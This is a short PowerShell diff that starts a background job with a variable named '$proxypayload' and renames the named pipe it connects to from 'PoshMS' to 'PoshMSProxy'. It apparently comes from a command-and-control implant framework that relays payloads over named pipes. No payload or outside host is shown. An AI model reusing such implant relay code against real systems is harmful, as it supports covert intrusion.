@@ -21,6 +21,6 @@
 }
 
 start-job -ScriptBlock $scriptblock -ArgumentList @("PoshMSProxy",$proxypayload)
-$pi = new-object System.IO.Pipes.NamedPipeClientStream(".", "PoshMS");
+$pi = new-object System.IO.Pipes.NamedPipeClientStream(".", "PoshMSProxy");
 
 
